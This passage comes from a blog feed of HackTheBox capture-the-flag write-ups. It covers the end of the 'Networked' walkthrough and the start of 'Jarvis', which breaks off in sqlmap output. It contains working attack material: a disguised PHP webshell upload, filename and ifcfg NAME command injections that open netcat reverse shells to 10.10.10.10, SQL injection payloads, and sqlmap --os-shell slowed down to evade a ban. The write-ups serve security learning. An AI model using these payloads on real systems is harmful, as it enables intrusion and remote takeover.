class="code"><pre><span class="line">[hg8@archbook ~]$ mv hg8.jpg hg8.php.jpg</span><br></pre></td></tr></table></figure><p>We are ready to upload now! Everything seems to went fine since we get the following message : <code>file uploaded, refresh gallery</code>. The gallery is the <code>photos.php</code> endpoint. Opening this page display a list of recently uploaded files and one with the <code>.php.jpg</code> extension get the attention.</p><p>In the <code>upload.php</code> file we got information about the location of stored images :</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">define(<span class="string">&quot;UPLOAD_DIR&quot;</span>, <span class="string">&quot;/var/www/html/uploads/&quot;</span>);</span><br></pre></td></tr></table></figure><p>We have the location of the upload folder and the name of the file. Let’s open it ! Mine is at <a href="http://networked.htb/uploads/10_10_15_101.php.jpg">http://networked.htb/uploads/10_10_15_101.php.jpg</a></p><p><img src="https://user-images.githubusercontent.com/9076747/67150075-50318080-f2b3-11e9-8195-26034691deeb.png" alt="Networked upload"></p><h3 id="Pivot-PHP-Webshell-gt-guly"><a href="#Pivot-PHP-Webshell-gt-guly" class="headerlink" title="Pivot PHP Webshell -&gt; guly"></a>Pivot PHP Webshell -&gt; guly</h3><p>Now that we have a working process let’s replace the <code>phpinfo()</code> by a webshell and we can easily land a shell running as <code>apache</code> user :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">networked.htb:/var/www/html/uploads $ id</span><br><span class="line">uid=48(apache) gid=48(apache) groups=48(apache)</span><br></pre></td></tr></table></figure><p>The first thing I do after landing a webshell is to check the <code>/etc/password</code> file to find the user we will need to pivot to for finding our flag.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">networked.htb:/var/www/html/uploads $ cat /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">[...]</span><br><span class="line">guly:x:1000:1000:guly:/home/guly:/bin/bash</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure><p>Beside <code>root</code> the only user to have a shell setup is <code>guly</code>. It’s our new target ;)</p><p>First we will check if <code>guly</code> have any interesting file in his home folder :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ ls -l /home/guly</span><br><span class="line">total 16</span><br><span class="line">-r--r--r--. 1 root root 782 Oct 30  2018 check_attack.php</span><br><span class="line">-rw-r--r--  1 root root  44 Oct 30  2018 crontab.guly</span><br><span class="line">-rw-------  1 guly guly 770 Oct 19 18:28 dead.letter</span><br><span class="line">-r--------. 1 guly guly  33 Oct 30  2018 user.txt</span><br></pre></td></tr></table></figure><p>The flag is indeed there upon various other files.</p><p>We can see two interresting files in <code>guly</code> home foler. A crontab file and a php script :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cat /home/guly/crontab.guly</span><br><span class="line">*/3 * * * * php /home/guly/check_attack.php</span><br></pre></td></tr></table></figure><p>The cronjob run the <code>check_attack.php</code> script every 3 minutes.</p><p>We don’t have write access to the script so we are not able to edit it to inject command. Since we have read access let’s investigate to see if we can find a vulnerability in the runtime :</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;/var/www/html/lib.php&#x27;</span>;</span><br><span class="line"><span class="variable">$path</span> = <span class="string">&#x27;/var/www/html/uploads/&#x27;</span>;</span><br><span class="line"><span class="variable">$logpath</span> = <span class="string">&#x27;/tmp/attack.log&#x27;</span>;</span><br><span class="line"><span class="variable">$to</span> = <span class="string">&#x27;guly&#x27;</span>;</span><br><span class="line"><span class="variable">$msg</span>= <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$headers</span> = <span class="string">&quot;X-Mailer: check_attack.php\r\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$files</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="variable">$files</span> = preg_grep(<span class="string">&#x27;/^([^.])/&#x27;</span>, scandir(<span class="variable">$path</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">[...]</span><br><span class="line">    exec(<span class="string">&quot;rm -f <span class="subst">$logpath</span>&quot;</span>);</span><br><span class="line">    exec(<span class="string">&quot;nohup /bin/rm -f <span class="subst">$path</span><span class="subst">$value</span> &gt; /dev/null 2&gt;&amp;1 &amp;&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;rm -f <span class="subst">$path</span><span class="subst">$value</span>\n&quot;</span>;</span><br><span class="line">    mail(<span class="variable">$to</span>, <span class="variable">$msg</span>, <span class="variable">$msg</span>, <span class="variable">$headers</span>, <span class="string">&quot;-F<span class="subst">$value</span>&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>Three <code>exec</code> calls, we will surely find a way to inject something…</p><p>First exec (<code>exec(&quot;rm -f $logpath&quot;);)</code> can’t do anything since <code>$logpath</code> is harcoded.</p><p>Second exec (<code>exec(&quot;nohup /bin/rm -f $path$value &gt; /dev/null 2&gt;&amp;1 &amp;&quot;);</code> is already more interesting. Reading thought the code we understand that <code>$value</code> is dynamically fetched from the filenames of files present in the <code>/var/www/html/uploads/</code> folder.</p><p>For example with our previously uploaded image file (<code>hg8.php.jpg</code>) the executed command will be :</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec(<span class="string">&quot;nohup /bin/rm -f /var/www/html/uploads/hg8.php.jpg &gt; /dev/null 2&gt;&amp;1 &amp;&quot;</span>);</span><br></pre></td></tr></table></figure><p>So if we are a file named, for example, <code>; sleep 5 ;</code> here is what the executed command will be:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec(<span class="string">&quot;nohup /bin/rm -f /var/www/html/uploads/; sleep 5 ; &gt; /dev/null 2&gt;&amp;1 &amp;&quot;</span>);</span><br></pre></td></tr></table></figure><p>Since we have write access to the <code>/var/www/html/uploads/</code> folder let’s try it out with a reverse shell.</p><p>Firstly let’s open our listener :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8544</span><br><span class="line">Listening on any address 8544</span><br></pre></td></tr></table></figure><p>And let’s create our ‘malicious’ file :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">networked.htb:/var/www/html/uploads$ touch <span class="string">&quot;; nc 10.10.10.10 8544 -c bash ;&quot;</span></span><br></pre></td></tr></table></figure><p>We wait a little bit for the cronjob to run and surely a new connection open on our listener :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8544</span><br><span class="line">Listening on any address 8544</span><br><span class="line">Connection from 10.10.10.146:52024</span><br><span class="line">[guly@networked ~]$ id</span><br><span class="line">uid=1000(guly) gid=1000(guly) groups=1000(guly)</span><br><span class="line">[guly@networked ~]$ cat user.txt</span><br><span class="line">526cxxxxxxxxxxx1c5</span><br></pre></td></tr></table></figure><h2 id="Root-Flag"><a href="#Root-Flag" class="headerlink" title="Root Flag"></a>Root Flag</h2><h3 id="Recon-1"><a href="#Recon-1" class="headerlink" title="Recon"></a>Recon</h3><p>To make the recon task easier, we are going to use the <a href="https://github.com/diego-treitos/linux-smart-enumeration">Linux enumeration tool</a>. For the transfer of the script we will setup a simple http server on our attacking machine:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ wget <span class="string">&quot;https://github.com/diego-treitos/linux-smart-enumeration/raw/master/lse.sh&quot;</span> -O lse.sh</span><br><span class="line">[hg8@archbook ~]$ python -m http.server</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span><br><span class="line"></span><br><span class="line">[guly@networked]$ wget 10.10.10.10:8000/lse.sh -O /tmp/lse.sh</span><br><span class="line">2019-10-17 08:00:49 (527 KB/s) - <span class="string">&#x27;/tmp/lse.sh&#x27;</span> saved [31736/31736]</span><br></pre></td></tr></table></figure><p>Let’s run the script to see if we can find anything intesrresting :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[guly@networked]$ bash /tmp/lse.sh</span><br><span class="line"></span><br><span class="line">[...]</span><br><span class="line">===================================================================( sudo )=====</span><br><span class="line">[!] sud000 Can we sudo without a password?................................. nope</span><br><span class="line">[!] sud010 Can we list sudo commands without a password?................... yes!</span><br><span class="line">---</span><br><span class="line">User guly may run the following commands on networked:</span><br><span class="line">    (root) NOPASSWD: /usr/<span class="built_in">local</span>/sbin/changename.sh</span><br><span class="line">==================================( FINISHED )==================================</span><br></pre></td></tr></table></figure><p>We notice a very interesting configuration here. The script <code>/usr/local/sbin/changename.sh</code> can be run as <code>root</code> without password through sudo. If we can edit or find a flaw in this script it will be our pass to the root flag.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[guly@networked tmp]$ ls -l /usr/<span class="built_in">local</span>/sbin/changename.sh</span><br><span class="line">-rwxr-xr-x 1 root root 422 Jul  8 12:34 /usr/<span class="built_in">local</span>/sbin/changename.sh</span><br></pre></td></tr></table></figure><p>Without surprise we can not write in the file. Let’s investigate to check if we can find a flow in it’s working.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">[guly@networked]$ cat /usr/<span class="built_in">local</span>/sbin/changename.sh</span><br><span class="line"><span class="comment">#!/bin/bash -p</span></span><br><span class="line">cat &gt; /etc/sysconfig/network-scripts/ifcfg-guly &lt;&lt; <span class="string">EoF</span></span><br><span class="line"><span class="string">DEVICE=guly0</span></span><br><span class="line"><span class="string">ONBOOT=no</span></span><br><span class="line"><span class="string">NM_CONTROLLED=no</span></span><br><span class="line"><span class="string">EoF</span></span><br><span class="line"></span><br><span class="line">regexp=<span class="string">&quot;^[a-zA-Z0-9_\ /-]+$&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> var <span class="keyword">in</span> NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; <span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;interface <span class="variable">$var</span>:&quot;</span></span><br><span class="line">    <span class="built_in">read</span> x</span><br><span class="line">    <span class="keyword">while</span> [[ ! <span class="variable">$x</span> =~ <span class="variable">$regexp</span> ]]; <span class="keyword">do</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;wrong input, try again&quot;</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;interface <span class="variable">$var</span>:&quot;</span></span><br><span class="line">        <span class="built_in">read</span> x</span><br><span class="line">    <span class="keyword">done</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$var</span>=<span class="variable">$x</span> &gt;&gt; /etc/sysconfig/network-scripts/ifcfg-guly</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line">/sbin/ifup guly0</span><br></pre></td></tr></table></figure><p>The script take various user input to set them in a network configuration file <code>/etc/sysconfig/network-scripts/ifcfg-guly</code>. At the end the <code>/sbin/ifup guly0</code> apply the new configuration.</p><h3 id="network-script-privilege-escalation"><a href="#network-script-privilege-escalation" class="headerlink" title="network-script privilege escalation"></a>network-script privilege escalation</h3><p>This one was new for me, while searching for informations about <code>network-script</code> I stumbled across this <code>SecList</code>:</p><blockquote><p>Redhat/CentOS root through network-scripts<br>If, for whatever reason, a user is able to write an ifcf-<whatever> script to /etc/sysconfig/network-scripts or it can<br>adjust an existing one, then your system in pwned.<br>In my case, the NAME= attributed in these network scripts is not handled correctly. If you have white/blank space in<br>the name the system tries to execute the part after the white/blank space. Which means; everything after the first<br>blank space is executed as root.</p><p>For example:</p><p>/etc/sysconfig/network-scripts/ifcfg-1337</p><p>NAME=Network /bin/id  &lt;= Note the blank space<br>ONBOOT=yes<br>DEVICE=eth0</p><p>Yes, any script in that folder is executed by root because of the sourcing technique.</p><p><a href="https://seclists.org/fulldisclosure/2019/Apr/24">https://seclists.org/fulldisclosure/2019/Apr/24</a></p></blockquote><p>Sounds exactly what we need since the <code>changename.sh</code> script edit the <code>NAME</code> value with user input string. And now I understand why the <code>Networked</code> name was chosen.</p><p>Let’s give it a try. First we open a new listener:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8599</span><br><span class="line">Listening on any address 8599</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[guly@networked]$ sudo /usr/<span class="built_in">local</span>/sbin/changename.sh</span><br><span class="line">interface NAME:</span><br><span class="line">nc -e /bin/sh 10.10.10.10 8599</span><br><span class="line">wrong input, try again</span><br><span class="line">interface NAME:</span><br><span class="line">^C</span><br></pre></td></tr></table></figure><p>Alright, that couldn’t be that easy… The input is filtered. The rule is the following:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">regexp=<span class="string">&quot;^[a-zA-Z0-9_\ /-]+$&quot;</span></span><br></pre></td></tr></table></figure><p>This regex doesn’t seems that bad, we can still use <code>_</code>, spaces, <code>/</code> and <code>-</code>. To be honest at this point it gets really easy to overthink the solution which is quite simple in the end.</p><p>Call to an external script should perfectly work:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[guly@networked]$ <span class="built_in">echo</span> <span class="string">&quot;nc -e /bin/sh 10.10.10.10 8599&quot;</span> &gt; /tmp/hg8</span><br><span class="line">[guly@networked]$ chmod +x /tmp/hg8</span><br><span class="line">[guly@networked tmp]$ sudo /usr/<span class="built_in">local</span>/sbin/changename.sh</span><br><span class="line">interface NAME:</span><br><span class="line">/bin/bash /tmp/hg8</span><br><span class="line">interface PROXY_METHOD:</span><br><span class="line">hg8</span><br><span class="line">interface BROWSER_ONLY:</span><br><span class="line">hg8</span><br><span class="line">interface BOOTPROTO:</span><br><span class="line">hg8</span><br></pre></td></tr></table></figure><p>And bingo, a connection open on our listener:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8599</span><br><span class="line">Listening on any address 8599</span><br><span class="line">Connection from 10.10.10.146:46502</span><br><span class="line">[root@networked ~]<span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">[root@networked ~]<span class="comment"># cat /root.txt</span></span><br><span class="line">0a8ecxxxxxxxxxxxxxcb82</span><br></pre></td></tr></table></figure><p>I had a lot of fun with this box and learned a few new things. I hope this writeup could help you too.</p><p>As always do not hesitate to contact me for any questions or feedbacks!</p><p>See you next time !</p><p>-hg8</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> HackTheBox </category>
          
          <category> Easy Box </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> webshell </tag>
            
            <tag> sudo </tag>
            
            <tag> gobuster </tag>
            
            <tag> command-injection </tag>
            
            <tag> upload </tag>
            
            <tag> networked </tag>
            
            <tag> php </tag>
            
            <tag> weevely </tag>
            
            <tag> filtering </tag>
            
            <tag> ifcfg </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox - Jarvis</title>
      <link href="/posts/jarvis/"/>
      <url>/posts/jarvis/</url>
      
        <content type="html"><![CDATA[<img width="582" alt="jarvis-hackthebox" src="https://user-images.githubusercontent.com/9076747/82158090-f4010000-9885-11ea-8bb6-383fd343d13c.png"><p>Jarvis was a pretty straight forward box and “textbook case” style. While it’s rated as Medium difficulty I would advise beginners to start with this one.</p><p>It rely on bad configurations practices rather than already made exploits which makes it more interesting in my opinion.</p><p>First thing first, let’s add the box IP to the hosts file:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">&quot;10.10.10.143 jarvis.htb&quot;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure><p>Let’s go !</p><h2 id="User-Flag"><a href="#User-Flag" class="headerlink" title="User Flag"></a>User Flag</h2><h3 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h3><p>Let’s start with the classic <code>nmap</code> scan:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nmap -sV -sT -sC jarvis.htb</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-16 19:16 CEST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> jarvis.htb (10.10.10.143)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.25 ((Debian))</span><br><span class="line">|_http-server-header: Apache/2.4.25 (Debian)</span><br><span class="line">|_http-title: Stark Hotel</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure><p>Seems like we have somethig super classic: A http (port 80) and SSH (port 22) service open.</p><p>Opening the <code>http://jarvis.htb</code> display the following website :</p><p><img src="https://user-images.githubusercontent.com/9076747/66945555-8cfd3d80-f04f-11e9-9481-4cdf99eadcfa.png" alt="Jarvis website"></p><p>Browsing the site shows available rooms, food and… that’s it. The only page that looks dynamic is the room description page:<br>Let’s keep that in mind.</p><p>Out of curiosity I ran <code>gobuster</code> to see if we can find interresting files and directories but nothing special was found :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ gobuster dir -u http://jarvis.htb -w ~/SecLists/Discovery/Web-Content/common.txt</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.0.1</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span><br><span class="line">===============================================================</span><br><span class="line">/.htaccess (Status: 403)</span><br><span class="line">/.htpasswd (Status: 403)</span><br><span class="line">/.hta (Status: 403)</span><br><span class="line">/css (Status: 301)</span><br><span class="line">/fonts (Status: 301)</span><br><span class="line">/images (Status: 301)</span><br><span class="line">/index.html (Status: 200)</span><br><span class="line">/index.php (Status: 200)</span><br><span class="line">/js (Status: 301)</span><br><span class="line">/phpmyadmin (Status: 301)</span><br></pre></td></tr></table></figure><p>Maybe the <code>phpmyadmin</code> instance will come useful in the future.</p><p>Oddly enough I could run <code>gobuster</code> without issue while during my first walkthrough I got banned when using any automated scanner and got the following message :</p><blockquote><p>Hey you have been banned for 90 seconds, don’t be bad</p></blockquote><h3 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h3><p>Since we have no other interesting entry point so far let’s focus on that room page.</p><p>Looking the url <code>http://jarvis.htb/room.php?cod=1</code>, we immediatly notice the <code>cod=1</code> parameter. Let’s try some injection here, starting with the most common: SQL Injection.</p><p>Appending various characters to the <code>cod</code> parameters yield an empty room description :</p><p><img src="https://user-images.githubusercontent.com/9076747/66947239-d56a2a80-f052-11e9-9af5-ff160024847f.png" alt="Jarvis website cod parameter"></p><p>After a few tries we discover that the classical <code>AND 1=1</code> payload works.</p><p>Opening <code>http://jarvis.htb/room.php?cod=1</code> and <code>http://jarvis.htb/room.php?cod=1 AND 1=1</code> return the exact same result :</p><p><img src="https://user-images.githubusercontent.com/9076747/66947449-3691fe00-f053-11e9-8be6-0a53d6269fc0.png" alt="Jarvis website cod parameter injection"></p><p>Let’s automate the process with our favorite SQL injection toolkit: <a href="http://sqlmap.org/">SQLMap</a>.</p><p>A very useful option (in our case) is <code>--os-shell</code>, with it SQLMap will if possible use the SQL injection to upload and open a reverse shell to the server.</p><p>Let’s let SQLMap do all the dirty work for us:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://jarvis.htb/room.php?cod=6&quot;</span> --os-shell</span><br><span class="line">        ___</span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[<span class="string">&quot;]_____ ___ ___  &#123;1.3.10#stable&#125;</span></span><br><span class="line"><span class="string">|_ -| . [.]     | .&#x27;| . |</span></span><br><span class="line"><span class="string">|___|_  [&#x27;]_|_|_|__,|  _|</span></span><br><span class="line"><span class="string">      |_|V...       |_|   http://sqlmap.org</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[...]</span></span><br><span class="line"><span class="string">[10:56:40] [CRITICAL] page not found (404)</span></span><br><span class="line"><span class="string">[10:56:40] [WARNING] HTTP error codes detected during run:</span></span><br><span class="line"><span class="string">404 (Not Found) - 2 times</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] ending @ 10:56:40 /2019-10-17/</span></span><br></pre></td></tr></table></figure><p>No surprise, we get banned here with the same error message :</p><blockquote><p>Hey you have been banned for 90 seconds, don’t be bad.</p></blockquote><p>Let’s try different options. First adding a delay of 10 seconds between each request (with <code>--delay=10</code>) might not trigger the ban:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ sqlmap -u <span class="string">&quot;http://jarvis.htb/room.php?cod=6&quot;</span> --delay=10 --os-shell</span><br><span class="line">        ___</span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[)]_____ ___ ___  &#123;1.3.10<span class="comment">#stable&#125;</span></span><br><span class="line">|_ -| . [<span class="string">&quot;]     | .&#x27;| . |</span></span><br><span class="line"><span class="string">|___|_  [,]_|_|_|__,|  _|</span></span><br><span class="line"><span class="string">      |_|V...       |_|   http://sqlmap.org</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[...]</span></span><br><span class="line"><span class="string">[20:02:08] [INFO] heuristic (basic) test shows that GET parameter &#x27;cod&#x27; might be injectable</span></span><br><span class="line"><span class="string">[20:02:09] [INFO] GET parameter &#x27;cod&#x27; appears to be &#x27;AND boolean-based blind - WHERE or HAVING clause&#x27; injectable (with --string=&quot;</span>high<span class="string">&quot;)</span></span><br><span class="line"><span class="string">[20:02:10] [INFO] heuristic (extended) test shows that the back-end DBMS could be &#x27;MySQL&#x27;</span></span><br><span class="line"><span class="string">[...]</span></span><br><span class="line"><span class="string">[20:02:35] [INFO] GET parameter &#x27;cod&#x27; appears to be &#x27;MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)&#x27; injectable</span></span><br><span class="line"><span class="string">[20:02:37] [INFO] GET parameter &#x27;cod&#x27; is &#x27;Generic UNION query (NULL) - 1 to 20 columns&#x27; injectable</span></span><br><span class="line"><span class="string">sqlmap identified the following injection point(s) with a total of 73 HTTP(s) requests:</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">Parameter: cod (GET)</span></span><br><span class="line"><span class="string">    Type: boolean-based blind</span></span><br><span class="line"><span class="string">    Title: AND boolean-based blind - WHERE or HAVING clause</span></span><br><span class="line"><span class="string">    Payload: cod=6 AND 2304=2304</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: time-based blind</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span></span><br><span class="line"><span class="string">    Payload: cod=6 AND (SELECT 4682 FROM (SELECT(SLEEP(5)))PeAe)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: UNION query</span></span><br><span class="line"><span class="string">    Title: Generic UNION query (NULL) - 7 columns</span></span><br><span class="line"><span class="string">    Payload: cod=-3361 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71767a7071,0x4d496842456c564972414349534c7467674866537166477a644d4f456341536d6453775166635779,0x716b626a71),NULL,NULL,NULL-- VXEr</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">[20:02:40] [INFO] the back-end DBMS is MySQL</span></span><br><span class="line"><span class="string">back-end DBMS: MySQL &gt;= 5.0.12</span></span><br><span class="line"><span class="string">[20:02:40] [INFO] going to use a web backdoor for command prompt</span></span><br><span class="line"><span class="string">[20:02:40] [INFO] fingerprinting the back-end DBMS operating system</span></span><br><span class="line"><span class="string">[20:02:40] [INFO] the back-end DBMS operating system is Linux</span></span><br><span class="line"><span class="string">[...]</span></span><br><span class="line"><span class="string">[20:02:41] [WARNING] unable to automatically retrieve the web server document root</span></span><br><span class="line"><span class="string">what do you want to use for writable directory?</span></span><br><span class="line"><span class="string">[...]</span></span><br><span class="line"><span class="string">[20:02:44] [INFO] trying to upload the file stager on &#x27;/var/www/html/&#x27; via LIMIT &#x27;LINES TERMINATED BY&#x27; method</span></span><br><span class="line"><span class="string">[20:02:45] [INFO] the file stager has been successfully uploaded on &#x27;/var/www/html/&#x27; - http://jarvis.htb:80/tmpuhbex.php</span></span><br><span class="line"><span class="string">[20:02:45] 